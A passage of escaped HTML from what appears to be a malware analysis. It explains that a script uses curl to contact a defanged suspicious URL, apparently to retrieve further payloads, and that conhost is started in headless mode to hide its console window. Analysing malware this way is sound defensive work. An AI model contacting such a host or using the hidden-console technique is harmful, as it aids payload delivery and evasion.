inside.\u003co:p\u003e\u003c/o:p\u003e\u003c/span\u003e\u003c/li\u003e\u003cli\u003e\u003cspan style=\"letter-spacing:.25pt;\" lang=\"EN-GB\"\u003eThe script downloads or interacts with the URL \u003cstrong\u003egizpvovur[.]top/1.php?s=mints13 \u003c/strong\u003eusing \u003cstrong\u003ecurl\u003c/strong\u003e. This behaviour could be part of a script to retrieve further payloads or instructions from a remote server, and it has potential malicious intent.\u003co:p\u003e\u003c/o:p\u003e\u003c/span\u003e\u003c/li\u003e\u003c/ul\u003e\u003cp\u003e\u003cspan style=\"font-family:\u0026quot;Aptos\u0026quot;,sans-serif;font-size:11.0pt;letter-spacing:.25pt;line-height:107%;\" lang=\"EN-GB\"\u003eLet's move on to the next step. Such type of activity can be risky as a script using this can potentially be used for malicious activities, such as terminating security-related processes or starting unwanted processes.\u003co:p\u003e\u003c/o:p\u003e\u003c/span\u003e\u003c/li\u003e\u003c/ul\u003e\u003cp\u003e\u003cspan lang=\"EN-GB\"\u003e\u003cstrong\u003eHeadless console host environment:\u003c/strong\u003e\u003c/span\u003e\u003cspan style=\"font-style:normal;font-weight:normal;\" lang=\"EN-GB\"\u003e\u003co:p\u003e\u003c/o:p\u003e\u003c/span\u003e\u003c/p\u003e\u003cul\u003e\u003cli\u003e\u003cspan style=\"letter-spacing:.25pt;\" lang=\"EN-GB\"\u003eThe command starts \u003cstrong\u003econhost (Console Window Host) in headless mode\u003c/strong\u003e, meaning it runs without displaying a console window.
